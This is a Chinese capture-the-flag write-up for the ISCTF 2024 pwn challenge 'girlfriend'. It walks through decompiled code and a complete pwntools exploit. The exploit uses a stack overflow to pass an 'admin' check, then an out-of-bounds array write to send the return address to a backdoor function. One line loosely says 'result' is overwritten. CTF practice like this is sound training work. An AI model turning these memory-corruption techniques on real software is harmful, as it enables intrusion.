# ISCTF pwn方向“girlfriend"

by Maple

直接明确的：

1. 通过溢出覆盖元素内容
2. 通过数组越界覆盖返回地址

**main:**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[40]; // [rsp+0h] [rbp-30h] BYREF
  char s1[8]; // [rsp+28h] [rbp-8h] BYREF

  init(argc, argv, envp);
  puts("welcome to isctf2024");
  puts("first i need your team id");
  read(0, buf, 0x30uLL);
  if ( strcmp(s1, "admin") )
  {
    puts("no no no");
    exit(0);
  }
  puts("ok, go on");
  vuln();
  return 0;
}
```

要求`s1`和为`admin`，可以看到`s1`距离栈底偏移为0x28，所以填充0x28个数据再写入admin就好了

```python	
payload = b'b'*0x28 + b'admin'
p.sendafter(b'team id', payload)
```

**vuln:**

```c
__int64 vuln()
{
  __int64 result; // rax
  _QWORD v1[5]; // [rsp+0h] [rbp-30h] BYREF
  __int64 i; // [rsp+28h] [rbp-8h]

  for ( i = 0LL; i <= 7; ++i )
  {
    printf("please input your %d girlfriend birthday\n", i + 1);
    result = __isoc99_scanf("%ld", &v1[i]);
  }
  return result;
}
```

一共八次输入，但v1只有5个元素，第八次输入的时候恰好会覆盖result，所以前面先输入一些，第八次改为后门函数的地址就可以了

```python
for i in range(7):
    p.recvuntil(b'birthday\n')
    p.sendline(b'5')
payload = str(0x40121E)
p.sendlineafter(b'birthday\n' , payload)
```

**总exp**：

```python
from pwn import *
elf = ELF("./pwn")
context.log_level = 'debug'
p = process('./pwn')
payload = b'b'*0x28
payload += b'admin'
p.sendafter(b'team id', payload)
for i in range(7):
    p.recvuntil(b'birthday\n')
    p.sendline(b'5')
payload = str(0x40121E)
p.sendlineafter(b'birthday\n' , payload)
p.interactive()
```

